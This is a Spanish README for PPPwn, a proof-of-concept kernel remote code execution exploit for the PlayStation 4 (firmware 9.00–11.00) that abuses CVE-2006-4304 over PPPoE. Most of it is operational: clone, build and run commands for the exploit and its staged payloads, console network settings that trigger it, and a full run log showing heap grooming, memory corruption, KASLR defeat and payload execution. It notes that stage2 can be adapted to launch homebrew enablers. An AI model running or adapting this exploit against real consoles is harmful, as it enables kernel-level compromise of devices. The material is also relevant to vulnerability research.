# PPPwn - PlayStation 4 PPPoE RCE
PPPwn es un exploit de ejecución remota de código de kernel para PlayStation 4 hasta FW 11.00. Este es un exploit de concepto de prueba para [CVE-2006-4304](https://hackerone.com/reports/2177925) que fue reportado de manera responsable a PlayStation.

Las versiones admitidas son:
- FW 9.00
- FW 9.03 / 9.04
- FW 9.50 / 9.60
- FW 10.00 / 10.01
- FW 10.50 / 10.70 / 10.71
- FW 11.00
- pueden agregarse más (se aceptan solicitudes de extracción)

El exploit solo imprime `PPPwned` en tu PS4 como prueba de concepto. Para lanzar Mira u otros habilitadores de software casero similares, el payload `stage2.bin` necesita ser adaptado.

## Requisitos
- Una computadora con un puerto Ethernet
  - También funciona un adaptador USB
- Cable Ethernet
- Linux
  - Puedes usar VirtualBox para crear una máquina virtual de Linux con `Adaptador en puente` como adaptador de red para usar el puerto Ethernet en la VM.
- Python3 y gcc instalados

## Uso

En tu computadora, clona el repositorio:

```sh
git clone --recursive https://github.com/TheOfficialFloW/PPPwn
```

Cambia al directorio del repositorio clonado:

```sh
cd PPPwn
```

Instala los requisitos:

```sh
sudo pip install -r requirements.txt
```

Compila los payloads:

```sh
make -C stage1 FW=1100 clean && make -C stage1 FW=1100
make -C stage2 FW=1100 clean && make -C stage2 FW=1100
```

Para otros firmware, por ejemplo FW 9.00, pasa `FW=900`.

Ejecuta el exploit (consulta `ifconfig` para la interfaz correcta):

```sh
sudo python3 pppwn.py --interface=enp0s3 --fw=1100
```

Para otros firmware, por ejemplo FW 9.00, pasa `--fw=900`.

En tu PS4:

- Ve a `Configuración` y luego a `Red`
- Selecciona `Configurar conexión a Internet` y elige `Usar cable LAN`
- Elije configuración `Personalizada` y elige `PPPoE` para `Configuración de direcciones IP`
- Ingresa cualquier cosa para `ID de usuario PPPoE` y `Contraseña PPPoE`
- Elige `Automático` para `Configuración de DNS` y `Configuración de MTU`
- Elige `No usar` para `Servidor proxy`
- Haz clic en `Probar conexión a Internet` para comunicarte con tu computadora

Si el exploit falla o la PS4 se bloquea, puedes omitir la configuración de internet y simplemente hacer clic en `Probar conexión a Internet`. Si el script `pppwn.py` está atascado esperando una solicitud/respueta, aborta y ejecútalo nuevamente en tu computadora, luego haz clic en `Probar conexión a Internet` en tu PS4.

Si el exploit funciona, deberías ver una salida similar a la siguiente, y deberías ver `No se puede conectar a la red.` seguido de `PPPwned` impreso en tu PS4.

### Ejecución de ejemplo

```sh
[+] PPPwn - PlayStation 4 PPPoE RCE by theflow
[+] args: interface=enp0s3 fw=1100 stage1=stage1/stage1.bin stage2=stage2/stage2.bin

[+] STAGE 0: Initialization
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 07:ba:be:34:d6:ab
[+] AC cookie length: 0x4e0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[*] Waiting for interface to be ready...
[+] Target IPv6: fe80::2d9:d1ff:febc:83e4
[+] Heap grooming...done

[+] STAGE 1: Memory corruption
[+] Pinning to CPU 0...done
[*] Sending malicious LCP configure request...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[+] Scanning for corrupted object...found fe80::0fdf:4141:4141:4141

[+] STAGE 2: KASLR defeat
[*] Defeating KASLR...
[+] pppoe_softc_list: 0xffffffff884de578
[+] kaslr_offset: 0x3ffc000

[+] STAGE 3: Remote code execution
[*] Sending LCP terminate request...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 97:df:ea:86:ff:ff
[+] AC cookie length: 0x511
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Triggering code execution...
[*] Waiting for stage1 to resume...
[*] Sending PADT...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634be9200
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] AC cookie length: 0x0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...

[+] STAGE 4: Arbitrary payload execution
[*] Sending stage2 payload...
[+] Done!
